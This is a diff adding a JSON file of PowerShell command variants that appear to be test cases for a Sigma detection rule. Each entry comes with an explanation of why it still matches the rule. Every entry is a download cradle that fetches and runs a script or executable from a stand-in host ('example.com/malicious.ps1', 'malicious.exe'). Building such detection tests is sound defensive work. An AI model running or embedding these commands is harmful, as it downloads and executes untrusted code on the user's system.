@@ -1,0 +1,26 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX ((New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1'))\"",
+    "explanation": "This command matches the Sigma rule by using the IEX (Invoke-Expression) pattern with a WebClient download. It is a direct representation of the suspicious behavior the rule is designed to detect."
+  },
+  {
+    "output": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\"",
+    "explanation": "This command uses the short form of the -Command option (-c) and omits extra parentheses, which is a valid syntactic variation of the original pattern."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX((New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1'))\"",
+    "explanation": "This command removes spaces between IEX and the parentheses, which is a valid syntactic variation that still matches the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\"",
+    "explanation": "This command removes spaces between IEX and (New-Object), which is a valid syntactic variation that still matches the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/malicious.exe', 'C:\\malicious.exe')\"",
+    "explanation": "This command matches the Sigma rule by using the WebClient DownloadFile method, which is another common pattern for downloading and executing malicious content."
+  },
+  {
+    "output": "powershell.exe -c \"(New-Object System.Net.WebClient).DownloadFile('http://example.com/malicious.exe', 'C:\\malicious.exe')\"",
+    "explanation": "This command uses the short form of the -Command option (-c) and is a valid syntactic variation of the DownloadFile method pattern."
+  }
+]
